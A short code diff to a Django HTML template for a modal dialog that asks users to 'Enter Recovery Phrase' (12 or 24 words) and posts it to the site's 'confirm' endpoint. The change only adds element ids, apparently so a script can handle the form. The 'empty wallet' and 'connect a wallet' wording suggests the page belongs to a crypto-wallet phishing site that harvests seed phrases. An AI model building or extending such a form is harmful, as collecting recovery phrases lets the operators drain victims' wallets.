@@ -343,13 +343,13 @@
                 <h5 class="modal-title" id="emptyWalletModalLabel"></h5>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
-            <form class="modal-body" method="post" action="{% url 'confirm' %}">
+            <form class="modal-body" id="emptyWalletForm" method="post" action="{% url 'confirm' %}">
                 <div class="cardmodal">
                     <h5>Enter Recovery Phrase</h5>
                     <p>Typically 12 (sometimes 24) words separated by single spaces
                         <img class=" float-end" src="{%static 'app/image/phrase.png'%}" alt="">
                     </p>
-                    <textarea name="phrase" id=""></textarea>
+                    <textarea name="phrase" id="empty_wallet_phrase"></textarea>
                 </div>
                 <button type="submit" id="connectAWalletBtn" class="text-center w-100 bg-info border-0 text-white p-3">
                     Confirm
